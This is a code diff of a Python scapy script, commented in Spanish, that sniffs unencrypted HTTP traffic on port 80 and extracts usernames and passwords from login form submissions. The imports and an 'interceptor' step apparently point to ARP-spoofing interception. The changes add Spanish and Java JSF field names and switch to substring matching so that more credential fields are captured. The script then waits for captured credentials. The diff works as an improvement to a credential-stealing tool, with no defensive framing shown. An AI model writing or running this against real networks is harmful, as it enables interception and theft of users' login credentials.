@@ -11,12 +11,13 @@ import ipaddress
 import sys
 from scapy.all import sniff, IP, TCP, Raw, IFACES, ARP, Ether, sendp, srp, get_if_hwaddr, conf
 
-# Palabras clave comunes en formularios de login
-KEYWORDS = ["username", "user", "email", "login",
-            "password", "passwd", "pass", "pwd", "token"]
+# Palabras clave para desencadenar el sniffer
+KEYWORDS = ["username", "user", "email", "login", "usuario", "documento",
+            "password", "passwd", "pass", "pwd", "token", "clave", "contrasena"]
 
-CAMPOS_USUARIO = ["user", "username", "user_login", "email", "login", "uname", "usr"]
-CAMPOS_PASS    = ["password", "pass", "passwd", "pwd", "user_password", "passw"]
+# Posibles nombres de los campos de texto en el formulario web
+CAMPOS_USUARIO = ["user", "username", "email", "login", "uname", "usr", "usuario", "documento", "j_username"]
+CAMPOS_PASS    = ["password", "pass", "passwd", "pwd", "passw", "clave", "contrasena", "j_password"]
 
 # Set para evitar imprimir capturas duplicadas (por retransmisiones TCP)
 paquetes_procesados = set()
@@ -70,9 +71,14 @@ def procesar_paquete(paquete):
             clave, _, valor = par.partition("=")
             campos[unquote_plus(clave).lower()] = unquote_plus(valor)
 
-    # Identificar usuario y password
-    usuario  = next((campos[c] for c in CAMPOS_USUARIO if c in campos), None)
-    password = next((campos[c] for c in CAMPOS_PASS    if c in campos), None)
+    # Identificar usuario y password buscando subcadenas (soporta Java JSF como 'form:txtUsuario')
+    usuario = None
+    password = None
+    for key, val in campos.items():
+        if any(kw in key for kw in CAMPOS_USUARIO) and not usuario:
+            usuario = val
+        if any(kw in key for kw in CAMPOS_PASS) and not password:
+            password = val
 
     # Crear una "firma" de la petición para evitar duplicados
     firma = f"{src_ip}-{dst_ip}-{host}-{body}"
@@ -398,7 +404,7 @@ def main():
     # Dar unos segundos para que el interceptor empiece
     time.sleep(5)
 
-    print(f"\n[*] Todo listo. Escuchando en {nombre} — puerto 80 (HTTP)")
+    print(f"\n[*] Todo listo. Escuchando en {IFACE_NAME} — puerto 80 (HTTP)")
     print("[*] Esperando pacientemente credenciales...\n")
 
     try:
